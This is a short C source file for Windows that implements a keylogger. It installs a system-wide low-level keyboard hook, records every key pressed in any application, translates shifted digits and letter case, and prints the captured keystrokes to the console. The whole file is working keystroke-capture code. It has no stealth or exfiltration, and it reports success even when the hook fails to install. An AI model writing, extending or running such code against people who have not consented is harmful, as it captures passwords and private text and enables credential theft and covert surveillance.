#include <windows.h>
#include <stdio.h>

const char* key_names[256] = {0};

// Mapping for Shift + number keys
const char shift_numbers[10] = {'!', '@', '#', '$', '%', '^', '&', '*', '(', ')'};

void init_key_names() {
    key_names[VK_BACK]   = "[BACKSPACE]";
    key_names[VK_SPACE]  = " ";
    key_names[VK_RETURN] = "\n";
    key_names[VK_TAB]    = "[TAB]";
    key_names[VK_SHIFT]  = "";  // Don't print shift key itself
    key_names[VK_CONTROL] = "";
}

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam){
    
    KBDLLHOOKSTRUCT  *pkey = (KBDLLHOOKSTRUCT *) lParam;
    const char* name = key_names[pkey->vkCode];

    if(wParam == WM_KEYDOWN){
        // Check if Shift is held down
        BOOL shift_pressed = GetKeyState(VK_SHIFT) & 0x8000;
        
        // Handle number keys (0-9) with Shift
        if (pkey->vkCode >= '0' && pkey->vkCode <= '9') {
            int num = pkey->vkCode - '0';
            if (shift_pressed) {
                // Shift+0 gives ), Shift+1 gives !, etc.
                // Index wraps: 0→9, 1→0, 2→1, etc.
                printf("%c", shift_numbers[(num + 9) % 10]);
            } else {
                printf("%c", pkey->vkCode);
            }
        }
        // Handle letter keys (A-Z) with Shift (convert to uppercase)
        else if (pkey->vkCode >= 'A' && pkey->vkCode <= 'Z') {
            if (shift_pressed) {
                printf("%c", pkey->vkCode);  // Already uppercase
            } else {
                printf("%c", pkey->vkCode + 32);  // Convert to lowercase
            }
        }
        // Handle special named keys
        else if (name) {
            printf("%s", name);
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}


int main(){

    init_key_names();

    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if(!hhook){
        printf("Error\n");
    }
    printf("Success\n");

    MSG msg;
    while ((GetMessage(&msg, NULL, 0, 0)) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

}
